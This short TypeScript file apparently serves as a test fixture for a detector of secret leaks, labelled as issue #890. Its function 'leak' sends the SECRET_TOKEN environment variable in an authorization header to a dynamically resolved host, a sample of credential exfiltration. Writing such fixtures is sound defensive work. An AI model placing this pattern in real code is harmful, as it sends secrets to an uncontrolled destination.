// A non-public env secret reaching a network call body with a DYNAMIC
// destination: the suspicious exfil shape (#890).
const token = process.env.SECRET_TOKEN;
const destination = resolveTarget();
export async function leak() {
  await fetch(destination, { headers: { authorization: token } });
}
declare function resolveTarget(): string;
